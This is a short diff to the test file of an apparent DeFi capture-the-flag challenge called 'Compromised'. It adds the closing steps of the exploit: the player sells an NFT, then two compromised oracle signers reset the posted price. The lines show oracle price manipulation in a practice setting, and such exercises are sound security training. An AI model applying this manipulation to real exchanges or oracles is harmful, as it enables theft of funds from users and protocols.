@@ -97,6 +97,10 @@ describe("Compromised challenge", function () {
 
     await nftToken.connect(player).approve(exchange.address, 0);
 
+    await exchange.connect(player).sellOne(0);
+    /**Malicious oracles set price back to original price */
+    await oracle.connect(signer1).postPrice("DVNFT", INITIAL_NFT_PRICE);
+    await oracle.connect(signer2).postPrice("DVNFT", INITIAL_NFT_PRICE);
   });
 
   after(async function () {
